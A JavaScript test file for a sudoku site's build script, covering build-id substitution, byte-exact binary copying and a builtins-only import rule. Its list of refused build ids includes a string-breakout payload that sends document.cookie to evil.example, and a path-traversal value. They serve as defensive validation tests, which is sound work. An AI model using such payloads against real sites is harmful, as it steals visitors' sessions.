/* The build machinery, checked where the published tree cannot check it.

   tests/site.test.mjs asserts on what _site contains today. Two things it
   cannot see, and both are the kind that fail silently:

   1. The __BUILD__ substitution. No file in the repository carries the
      placeholder yet, so every published file substitutes zero times and a
      broken substitution would look exactly like the current, correct build.
      The day a service worker lands, a silent failure there pins every
      returning visitor to the cache they already have, with a green build.
   2. What scripts/build.mjs is allowed to import. The deploy job runs no
      npm install, because the build needs none; the moment it takes a
      dependency, that job breaks at the point where the only thing left to do
      is publish. This says so first, on a pull request.

   The substitution tests build a fixture tree rather than the repository, so
   they exercise the code path that has no input in this tree yet. */

import test from 'node:test';
import assert from 'node:assert/strict';
import { mkdtempSync, mkdirSync, readFileSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { dirname, join } from 'node:path';
import { fileURLToPath } from 'node:url';
import { build, BUILD_ID_PATTERN, PLACEHOLDER } from '../scripts/build.mjs';

const root = join(dirname(fileURLToPath(import.meta.url)), '..');

/* A minimal publishable tree: the one required allowlist entry, plus the two
   optional text files whose whole point is to carry the build id. */
function fixture(t) {
  const dir = mkdtempSync(join(tmpdir(), 'sudoku-build-'));
  t.after(() => rmSync(dir, { recursive: true, force: true }));

  writeFileSync(join(dir, 'index.html'), `<!doctype html><meta name=b content=${PLACEHOLDER}>`);
  writeFileSync(join(dir, 'sw.js'), `const CACHE = "sudoku-${PLACEHOLDER}";\n`);
  writeFileSync(join(dir, 'manifest.webmanifest'), `{"name":"s","id":"${PLACEHOLDER}"}`);
  /* Not text, so it must come through byte for byte and never be re-encoded. */
  mkdirSync(join(dir, 'icons'));
  const png = Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a, 0xff, 0xfe]);
  writeFileSync(join(dir, 'icons', 'app.png'), png);

  return { dir, out: join(dir, '_site'), png };
}

const read = (out, file) => readFileSync(join(out, file), 'utf8');

test('the build id replaces every __BUILD__ in every published text file', (t) => {
  const { dir, out, png } = fixture(t);

  const result = build({ root: dir, outDir: out, buildId: 'deadbeef1234' });

  assert.equal(result.buildId, 'deadbeef1234');
  assert.equal(result.idSource, 'BUILD_ID');

  const counts = Object.fromEntries(result.files.map((f) => [f.path, f.substitutions]));
  assert.deepEqual(counts, {
    'index.html': 1,
    'manifest.webmanifest': 1,
    'sw.js': 1,
    'icons/app.png': 0,
  });

  assert.equal(read(out, 'sw.js'), 'const CACHE = "sudoku-deadbeef1234";\n');
  assert.equal(JSON.parse(read(out, 'manifest.webmanifest')).id, 'deadbeef1234');
  for (const file of ['index.html', 'sw.js', 'manifest.webmanifest']) {
    assert.equal(
      read(out, file).includes(PLACEHOLDER),
      false,
      `${file} still holds ${PLACEHOLDER} after the build`,
    );
  }
  assert.deepEqual(readFileSync(join(out, 'icons', 'app.png')), png);
});

test('a build id that could break out of a string literal is refused', (t) => {
  const { dir, out } = fixture(t);

  /* The id is spliced verbatim into a service worker, which the browser runs
     with origin scope, and into JSON. Each of these ends the published file as
     something other than what it was. */
  const rejected = [
    'x"; fetch("https://evil.example/" + document.cookie); //',
    'abc\ndef',
    '../../etc',
    'a b',
    "it's",
    '-leading-dash',
    'x'.repeat(65),
  ];

  for (const id of rejected) {
    assert.equal(BUILD_ID_PATTERN.test(id), false, `${JSON.stringify(id)} should not match`);
    assert.throws(
      () => build({ root: dir, outDir: out, buildId: id }),
      /refusing to publish with BUILD_ID/,
      `build accepted ${JSON.stringify(id)}`,
    );
  }

  /* The shape CI actually passes, a commit SHA, has to keep working. */
  assert.equal(BUILD_ID_PATTERN.test('0123456789abcdef0123456789abcdef01234567'), true);
});

test('the build imports node builtins only, because the deploy job installs nothing', () => {
  const source = readFileSync(join(root, 'scripts', 'build.mjs'), 'utf8');
  const specifiers = [...source.matchAll(/\bfrom\s+'([^']+)'/g)].map((m) => m[1]);

  assert.ok(specifiers.length > 0, 'found no imports at all, so this check read the wrong file');
  const external = specifiers.filter((s) => !s.startsWith('node:'));
  assert.deepEqual(
    external,
    [],
    'the Deploy job runs no npm install, so an import from node_modules crashes the publish ' +
      `step. Restore npm ci --ignore-scripts in .github/workflows/deploy-pages.yml first:\n  ${external.join('\n  ')}`,
  );
});
